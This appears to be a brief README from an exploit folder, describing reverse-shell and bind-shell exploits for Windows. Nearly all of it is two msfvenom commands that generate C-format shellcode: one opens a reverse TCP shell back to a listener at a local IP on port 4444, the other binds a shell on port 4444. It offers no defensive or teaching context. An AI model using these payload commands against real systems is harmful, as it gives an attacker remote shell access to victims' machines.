This folder contains the exploit for both reverse_shell and bind_shell.

Reverse_Shell won't work for you.(:D) But try bind_tcp it will work.

#Command used to create Reverse_shell 

msfvenom -p windows/shell_reverse_tcp lhost=192.168.176.130 lport=4444 -f c -a x86 -b "\x00\x0a\x0d" EXITFUNC=thread
You can change lhost and lport accordingly.

#Command used to create Bind_shell

msfvenom -p windows/shell_bind_tcp lport=4444 -a x86 -b "\x00\x0a\x0d" -f c EXITFUNC=thread



